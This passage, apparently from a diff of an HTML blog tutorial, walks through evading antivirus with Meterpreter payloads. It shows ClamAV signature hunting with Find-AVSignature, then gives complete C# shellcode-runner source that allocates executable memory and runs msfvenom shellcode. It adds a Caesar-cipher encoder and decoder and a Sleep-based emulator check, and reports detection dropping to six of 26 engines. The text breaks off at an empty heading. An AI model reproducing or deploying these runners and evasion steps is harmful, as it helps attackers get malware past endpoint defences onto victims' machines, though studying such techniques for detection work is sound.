+C:\Tools\avtest1\met_40000.bin: Win.Trojan.MSShellcode-7 FOUND
+C:\Tools\avtest1\met_50000.bin: Win.Trojan.MSShellcode-7 FOUND
+C:\Tools\avtest1\met_60000.bin: Win.Trojan.MSShellcode-7 FOUND
+C:\Tools\avtest1\met_70000.bin: Win.Trojan.MSShellcode-7 FOUND
+C:\Tools\avtest1\met_73801.bin: Win.Trojan.MSShellcode-7 FOUND
+[...]</span>
+</code></div>
+The first file passes detection. This is no surprise, since it is empty. The second file, which
+contains the first 10000 bytes of our binary, is clean as well. This means that the first signature
+was detected in the third file, somewhere between offset 10000 and 20000.<br/><br/>
+It is important to note that offsets and number of detections found may vary for each generation of a Meterpreter executable.<br/><br/>
+We'll run Find-AVSignature again to split the Meterpreter executable with 1000 byte intervals,<br/>but only from offset 10000 to 20000.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force<br/>&gt; .\clamscan.exe C:\Tools\avtest2
+C:\Tools\avtest2\met_10000.bin: OK
+C:\Tools\avtest2\met_11000.bin: OK
+C:\Tools\avtest2\met_12000.bin: OK
+C:\Tools\avtest2\met_13000.bin: OK
+C:\Tools\avtest2\met_14000.bin: OK
+C:\Tools\avtest2\met_15000.bin: OK
+C:\Tools\avtest2\met_16000.bin: OK
+C:\Tools\avtest2\met_17000.bin: OK
+C:\Tools\avtest2\met_18000.bin: OK
+C:\Tools\avtest2\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND
+C:\Tools\avtest2\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND
+[...]</span>
+</code></div>
+The offending bytes are between offsets 18000 and 19000.<br/>Let's narrow this further by lowering the interval to 100 bytes and saving to a new directory.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force<br/>&gt; .\clamscan.exe C:\Tools\avtest3
+C:\Tools\avtest3\met_18000.bin: OK
+C:\Tools\avtest3\met_18100.bin: OK
+C:\Tools\avtest3\met_18200.bin: OK
+C:\Tools\avtest3\met_18300.bin: OK
+C:\Tools\avtest3\met_18400.bin: OK
+C:\Tools\avtest3\met_18500.bin: OK
+C:\Tools\avtest3\met_18600.bin: OK
+C:\Tools\avtest3\met_18700.bin: OK
+C:\Tools\avtest3\met_18800.bin: OK
+C:\Tools\avtest3\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND
+C:\Tools\avtest3\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND
+[...]</span>
+</code></div>
+The output reveals two different signatures. The first is located between 18800 and 18900 and
+the other is located between 18900 and 19000.
+The best approach is to handle each signature individually, so we'll first divide the 18800 to 18900
+range into 10-byte segments, saving the results to a new directory, then the other range into 10-byte segments, saving the results to a yet another new directory.<br/><br/>
+Etc.<br/><br/>I know it is not the most exciting part of this subject.<br/>It is not an effective way to bypass antivirus defenses, so let's move on.<br/><br/>
+<h4 id="interav">Bypassing Antivirus with Metasploit</h4>
+We could bypass antivirus with Metasploit encoders or encryptors but utilizing these is not an effective way to bypass antivirus defenses as of 2023, so again, let's move on.<br/><br/>
+<h4 id="interav">Bypassing Antivirus with Shellcode Runner in C#</h4>
+Let's try to compile our shellcode runner, which is presented as a 64-bit application. It looks like this:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Text;
+using System.Threading;
+namespace ConsoleApp1
+{
+  class Program
+  {
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+    uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+    uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+    UInt32 dwMilliseconds);
+
+    static void Main(string[] args)
+    {
+      byte[] buf = new byte[752]{
+        0xfc,0x48,0x83,0xe4...
+      }
+
+      int size = buf.Length;
+
+      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+      Marshal.Copy(buf, 0, addr, size);
+
+      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+      WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+  }
+}</span></span>
+</code></div>
+The buf variable contains the shellcode, which is an un-encoded and un-encrypted 64-bit Meterpreter shellcode generated with msfvenom.<br/>
+Copy the compiled executable to the Windows 10 victim machine,<br/>and perform an on-demand scan with Avira:<br/><br/>
+<img src="avirascanres.png" hegiht="80" width="70%" alt="avirascanres.png">
+<br/>
+Nice! Our custom shellcode runner bypassed Avira's signature detection.<br/>A ClamAV scan is also clean.<br/><br/>
+We would like to know how effective this bypass is. Let's scan our executable with AntiScan.Me.<br/>Looking at the results we see the following:<br/><br/>
+<img src="antiscanres.png" hegiht="80" width="70%" alt="antiscanres.png">
+<br/>
+11 of the 26 engines flagged our executable.<br/>This is not bad for a first attempt, especially considering that these engines executed both signature and heuristic scans.<br/><br/>
+
+Remember that uploading the executable to VirusTotal also sends the data to
+antivirus vendors for analysis.<br/>This could potentially expose the code we just
+developed.
+
+<h4>Encrypting the C# Shellcode Runner</h4>
+The key to bypassing antivirus signature detections is custom code, and since we want to encrypt
+the shellcode, we must also create a custom decryption routine to avoid detection.<br/>
+We will implement the Caesar Cipher as it is a more straightforward decryption routine than, for example, aes256.<br/><br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>namespace Helper
+{
+  class Program
+  {
+    static void Main(string[] args)
+    {
+      byte[] buf = new byte[752] {
+      0xfc,0x48,0x83,0xe4,0xf0...
+      }
+
+      byte[] encoded = new byte[buf.Length];
+
+      for(int i = 0; i &lt; buf.Length; i++)
+      {
+        encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+      }
+      StringBuilder hex = new StringBuilder(encoded.Length * 2);
+      foreach(byte b in encoded)
+      {
+      hex.AppendFormat("0x{0:x2}, ", b);
+      }
+      Console.WriteLine("The payload is: " + hex.ToString());
+    }
+  }
+}</span></span></code></div>
+</br>
+Now we can modify our existing C# shellcode runner project by copying the encrypted shellcode<br/>
+into it and adding the decrypting routine.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Text;
+using System.Threading;
+
+namespace ConsoleApp1
+{
+  class Program
+  {
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+    uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+    uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+    UInt32 dwMilliseconds);
+
+    static void Main(string[] args)
+    {
+      byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2...}
+      for(int i = 0; i &lt; buf.Length; i++)
+      {
+        buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+      }
+
+      int size = buf.Length;
+
+      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+      Marshal.Copy(buf, 0, addr, size);
+
+      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+      WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+  }
+}</span></span></code></div>
+Now, let’s test the effectiveness of this bypass technique. Since this unencrypted project
+bypassed both Avira and ClamAV, we’ll scan it with AntiScan.Me:
+</br></br>
+<img src="antiscanreskeepingitg.png" height="75%" width="65%" alt="antiscanreskeepingitg.png">
+</br></br>
+Only 7 out of 26 antivirus programs flagged our code.</br>This is a huge
+improvement over our previous attempt, which flagged 11 times.</br></br>
+At this point, we have had relative success bypassing signature detection.</br>In the next section, we
+will attempt to bypass heuristics detection techniques.
+</br></br>
+<h4 id="messing1">Simple Sleep Timers</h4>
+One of the more ancient techniques used to bypass behavior analysis involves exploiting time delays. In cases where an application is active within a simulator and the heuristics engine comes across a pause or sleep command, it will accelerate through the delay until the point at which the application recommences its operations.<br/><br/>This strategy prevents the need to endure a potentially lengthy waiting period during a heuristics scan.<br/><br/>
+
+A straightforward approach to capitalize on this method employs the Win32 Sleep API.<br/><br/>This particular API suspends the execution of the calling thread for a designated duration. When this segment of code is being simulated, the emulator identifies the Sleep call and expeditiously advances through the instruction.<br/><br/>
+
+By comparing the time of day before and after the Sleep command, we can easily ascertain whether the call was indeed fast-forwarded.<br/><br/>As an illustration, we can inject a two-second pause, and if the time comparisons show that the two seconds haven't elapsed during the instruction, we can deduce that the simulation is active.<br/><br/>Consequently, we can exit the process prior to executing any suspicious code.<br/><br/>
+
+Let's put this into practice.<br/><br/>We will reuse the original unencrypted C# shellcode runner and integrate the Sleep command into the Main method to identify temporal gaps.<br/><br/>In order to accomplish this, we must also include the pinvoke import declaration for Sleep:<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Text;
+using System.Threading;
+
+namespace ConsoleApp1
+{
+  class Program
+  {
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+    uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+    uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+    UInt32 dwMilliseconds);
+
+    [DllImport("kernel32.dll")]
+    static extern void Sleep(uint dwMilliseconds);
+    static void Main(string[] args)
+
+    static void Main(string[] args)
+    {
+      DateTime t1 = DateTime.Now;
+      Sleep(2000);
+      double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+      if(t2 &lt; 1.5)
+      {
+        return;
+      }
+
+      byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2...}
+      for(int i = 0; i &lt; buf.Length; i++)
+      {
+        buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+      }
+
+      int size = buf.Length;
+
+      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+      Marshal.Copy(buf, 0, addr, size);
+
+      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+      WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+  }
+}</span></span></code></div>
+Through the integration of the Sleep command and the time-lapse detection into the Caesar ciphered C# shellcode runner project, we have effectively merged these two methodologies.<br/>Executing a scan using the compiled executable produces a noteworthy outcome:<br/><br/>
+<img src="antiscanreshs.png" height="60%" width="60%" alt="antiscanhs.png"><br/><br/>
+This time, our code drew attention from merely six products.<br/><br/>This signifies progress, given that we've managed to outmaneuver Windows Defender's detection - a feature inherent in the majority of contemporary Windows-based systems.<br/><br/>
+The enhanced success in evading detection is quite remarkable, especially when considering the longstanding utilization of the Sleep function for evading behavioral analysis for over ten years.<br/><br/>
+If we only used simple sleep timers, the results would have not improved as we would have not bypass the signature based detections.<br/><br/>
+We are now on the brink of effectively circumventing all the antivirus products supported by antiscan.me.<br/><br/>As a result, in the ensuing section, we will transition to exploring alternative heuristic bypass techniques.<br/>
+<h4 id="messing2">Non-emulated APIs</h4>
+</br></br></br>
+~Thank you for reading~
+<h3 id="useful-references">Useful references</h3>
+<ul>
+<li></li>
+</ul>
+	<div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
